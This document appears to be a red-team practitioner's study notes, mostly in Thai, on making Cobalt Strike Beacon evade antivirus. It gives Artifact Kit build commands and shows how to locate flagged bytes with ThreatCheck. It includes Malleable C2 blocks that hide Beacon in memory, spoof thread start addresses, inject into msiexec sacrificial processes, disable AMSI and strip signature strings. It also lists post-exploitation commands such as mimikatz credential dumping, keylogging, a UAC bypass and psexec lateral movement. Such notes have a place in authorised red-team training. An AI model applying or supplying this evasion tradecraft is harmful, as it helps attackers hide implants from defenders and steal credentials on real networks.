
### Build new set of template (Compiled Artifact)

- This will output a new set of artifacts and an Aggressor script called `artifact.cna`

```Powershell
./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>

# Example Let's build a set of basic artifacts using the mailslot bypass template.

./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

- Use TheatCheck to simulate our template instead of virustotal https://github.com/rasta-mouse/ThreatCheck can analyse a binary by splitting it into little pieces and scanning them with Windows Defender (with cloud submission disabled) to identify the smallest possible chunk that is detected as malicious.

```Powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
```

- If detect use https://github.com/NationalSecurityAgency/ghidra **Navigation > Go To** and enter `file(0x9ce)` (or whatever offset ThreatCheck gave), and click **OK**

### Beacon Memory (Issues)

##### RWX Memory 

```Powershell
# เกิดจาก PAGE_EXECUTE_READWRITE เพราะ native application ทั่วไปไม่ใช้ RWX memory ยกเว้น PowerShell และ .NET programs แก้ไขด้วย Malleable C2
set userwx "false";
```

##### DLL Headers

```Powershell
# ค่า default ของ prepended loader จะโหลด PE headers ทั้งหมดเข้า memory รวมถึง DOS และ NT Headers ซึ่ง headers เหล่านี้ต้องการแค่ตอนโหลด PE sections เข้า memory เท่านั้น ไม่จำเป็นตอน runtime และการมี headers อยู่ใน memory ทำให้เห็นได้ชัดว่ามี PE รันอยู่ใน memory region นั้น แก้ไขด้วย Malleable C2
set copy_pe_header "false";
```

##### Module Stomping

```Powershell
# ปกติแล้ว RX memory regions (ที่เกี่ยวกับ `.text` section ของ PE) จะมี module บน disk รองรับอยู่เสมอ เพราะโหลดมาจาก disk แต่ Beacon PE ไม่มี module บน disk รองรับเพราะโหลดจาก memory ทำให้ดูผิดปกติ แก้ไขด้วย Malleable C2
set module_x64 "Hydrogen.dll";
```

##### String


```Powershell

downloads         # แสดงไฟล์ที่กำลัง download อยู่

```

##### API-Only Commands


##### Inline Commands

- Beacon Object File (BOF) -> โปรแกรม C ขนาดเล็กที่ compile แล้วส่งลงไปรันภายใน Beacon session โดยตรง พอรันเสร็จก็ถูกลบออกจาก memory ทันที

```Powershell
clipboard            # ดู clipboard ของ user ว่า copy อะไรไว้
getsystem            # เพิ่มสิทธิ์ตัวเองเป็น SYSTEM (สูงสุดของ Windows)
jump psexec          # ย้ายไปทำงานบนเครื่องอื่นในเครือข่าย
kerberos_ticket_use  # import Kerberos ticket เข้า session (ใช้ใน AD attacks)
reg                  # query ค่าใน Windows registry
runasadmin uac-cmstplua # bypass UAC เพื่อเพิ่มสิทธิ์
```

BOF รันบน main thread ของ Beacon เองเลย ดังนั้นไม่มีการสร้าง thread ใหม่ ซึ่ง OPSEC ดีกว่าวิธีอื่น

- ควบคุมวิธีที่ BOF โหลดเข้า memory ผ่าน Malleable C2

```Powershell
process-inject {
    set bof_allocator "VirtualAlloc";  # API ที่ใช้จอง memory
    set bof_reuse_memory "true";       # true = เก็บ memory ไว้แต่ล้างข้อมูล, false = คืน memory
    set min_alloc "8192";             # ขนาด memory ที่จองไว้ล่วงหน้า (bytes)
    set startrwx "false";             # false = memory ตอนพักมีสิทธิ์แค่ RW (อ่าน+เขียน)
    set userwx "false";               # false = memory ตอนรันมีสิทธิ์ RX (อ่าน+รัน) ไม่มีเขียน
}
```

##### Fork & Run Commands
- คำสั่งกลุ่มนี้ทำงานโดย inject shellcode เข้า process แล้วรันผ่าน thread ใหม่ ผลลัพธ์ส่งกลับมาผ่าน SMB named pipe (ท่อส่งข้อมูลภายใน Windows)
- แบ่งเป็น 2 แบบ

	- **Explicit** = inject เข้า process ที่มีอยู่แล้วในระบบ

	- **Spawn** = สร้าง process ใหม่ขึ้นมาก่อน (เรียกว่า "sacrificial process" หรือ process ที่ยอมให้ถูกสังเวย เพราะถ้า AV จับได้ก็แค่ process นี้ที่พัง ไม่กระทบ Beacon หลัก) แล้วค่อย inject เข้าไป

```Powershell
execute-assembly  # รัน .NET program (.exe) ใน memory โดยไม่ต้องเขียนลง disk (Spawn only)
powerpick         # รัน PowerShell โดยไม่ใช้ powershell.exe จริงๆ (Spawn only)
psinject          # เหมือน powerpick แต่ inject เข้า process ที่เราเลือกเอง (Explicit only)
portscan          # scan ports และ services ในเครือข่าย (ทั้งสองแบบ)
keylogger         # ดัก keystrokes ของ user (ทั้งสองแบบ)
printscreen       # ถ่าย screenshot (ทั้งสองแบบ)
desktop           # เปิด VNC เพื่อดูหน้าจอ remote (ทั้งสองแบบ)
mimikatz          # dump passwords และ credentials (ทั้งสองแบบ)
```

คำสั่งกลุ่มนี้มี OPSEC burden หนักที่สุด เพราะต้องทำหลายอย่างพร้อมกัน ได้แก่ inject shellcode + สร้าง thread ใหม่ + สร้าง named pipe และถ้าเป็น Spawn variant ก็ต้องสร้าง sacrificial process ใหม่ด้วย ซึ่ง AV มักจับได้

```Powershell
process-inject {
    set allocator "VirtualAllocEx";  # API ที่ใช้จอง memory ใน target process
                                     # NtMapViewOfSection ใช้ได้แค่ same-arch เท่านั้น

    set startrwx "false";
    set userwx "false";

    execute {
        # Beacon ลองทีละบรรทัดจากบนลงล่าง ถ้าแบบแรกใช้ไม่ได้ก็ไปแบบถัดไป
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";  # ใช้ได้แค่ใน process ตัวเอง, spoof start address
        NtQueueApcThread-s;  # early bird pattern, same arch only
        NtQueueApcThread;    # same arch only
        SetThreadContext;    # รองรับ x64 inject เข้า x86
    }
}
```

Thread spoofing คือการแกล้งทำให้ thread ดูเหมือนว่า start มาจาก function ที่ถูกต้องของ Windows เช่น `ntdll.dll!RtlUserThreadStart` แทนที่จะชี้ตรงไปที่ shellcode ทันที ช่วยหลีกเลี่ยง memory scan ที่ตรวจ thread start address

- ควบคุม sacrificial process และ post-ex DLLs ผ่าน post-ex block

```Powershell
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\msiexec.exe";   # process ที่ใช้เป็น sacrificial สำหรับ x64
    set spawnto_x86 "%windir%\\syswow64\\msiexec.exe";    # process ที่ใช้เป็น sacrificial สำหรับ x86
    set cleanup "true";           # ลบ loader ออกจาก memory หลังรันเสร็จ
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
                                  # ชื่อ named pipe ที่ใช้รับส่งผลลัพธ์ (สุ่มจาก list ที่ให้ไว้)
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";  # spoof start address สำหรับ thread ใหม่
    set amsi_disable "true";      # ปิด AMSI (ระบบ scan script ของ Windows) ใน powerpick, execute-assembly, psinject

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
    }
}
```

#####  Service Creation Commands

- คำสั่งที่สร้าง Windows service เพื่อรัน command หรือ Beacon service คือโปรแกรมที่รันอยู่ใน background ของ Windows ซึ่งสามารถสร้างบนเครื่องตัวเองหรือเครื่องอื่นในเครือข่ายก็ได้

```Powershell
elevate svc-exe              # เพิ่มสิทธิ์จาก high-integrity ขึ้นไปเป็น SYSTEM
jump psexec/psexec64/psexec_psh # ย้ายไปทำงานบนเครื่องอื่นโดยสร้าง service
remote-exec psexec           # รัน command บนเครื่องอื่นผ่าน service
```

**OPSEC ของ Service Creation** — service binary payload จะใช้ `rundll32` เป็น default sacrificial process เสมอ และไม่สามารถใช้ `spawnto` จาก Malleable C2 ได้เพราะ environment variables เช่น `%windir%` ใช้ไม่ได้ใน SYSTEM context ต้องใช้ `ak-settings` จาก Artifact Kit เพื่อกำหนด path แบบเต็มแทน
